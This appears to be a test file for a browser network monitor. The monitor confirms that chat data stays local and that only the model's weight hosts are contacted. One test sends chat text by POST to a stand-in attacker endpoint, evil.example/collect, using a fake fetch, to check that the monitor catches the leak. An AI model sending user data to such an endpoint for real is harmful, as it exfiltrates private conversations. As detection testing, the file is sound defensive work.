import { describe, it, expect } from "vitest";
import { patchFetch, summarize, chatSentIsZero, type NetEvent } from "@/lib/network-monitor";
import { isModelHost, MODEL, MODEL_HOSTS } from "@/config/model";

describe("network monitor (real wrapper around a fake fetch)", () => {
  const mk = () => { const calls: string[] = []; const scope = { fetch: (async (u: any) => { calls.push(String(u)); return new Response("ok"); }) as typeof fetch }; return { scope, calls }; };
  it("records model-host GETs with 0 body bytes and still calls through", async () => {
    const { scope, calls } = mk(); const ev: NetEvent[] = []; patchFetch(scope, (e) => ev.push(e));
    await scope.fetch("https://huggingface.co/mlc-ai/x/resolve/main/params.bin");
    await scope.fetch("https://raw.githubusercontent.com/mlc-ai/y.wasm");
    expect(calls).toHaveLength(2);
    const s = summarize(ev);
    expect(s.modelHostRequests).toBe(2); expect(chatSentIsZero(s)).toBe(true);
  });
  it("detects a POST body to a foreign host (would flip the indicator)", async () => {
    const { scope } = mk(); const ev: NetEvent[] = []; patchFetch(scope, (e) => ev.push(e));
    await scope.fetch("https://evil.example/collect", { method: "POST", body: "hello chat ✓" });
    const s = summarize(ev);
    expect(s.bodyBytesSent).toBe(new TextEncoder().encode("hello chat ✓").length);
    expect(s.otherHosts).toEqual(["evil.example"]); expect(chatSentIsZero(s)).toBe(false);
  });
  it("does not record paths/queries or bodies", async () => {
    const { scope } = mk(); const ev: NetEvent[] = []; patchFetch(scope, (e) => ev.push(e));
    await scope.fetch("https://huggingface.co/secret/path?q=abc", { method: "POST", body: "SECRET" });
    expect(JSON.stringify(ev)).not.toMatch(/secret|abc|SECRET/);
  });
  it("model-host check", () => {
    expect(isModelHost("https://huggingface.co/a")).toBe(true);
    expect(isModelHost("https://cdn-lfs.hf.co/x")).toBe(true);
    expect(isModelHost("https://huggingface.co.evil.com/")).toBe(false);
    expect(isModelHost("https://example.com/")).toBe(false);
  });
  it("single model constant is consistent", () => {
    expect(MODEL.weightsUrl).toContain(MODEL.id);
    expect(MODEL_HOSTS.some((h) => MODEL.weightsUrl.startsWith(h))).toBe(true);
  });
});
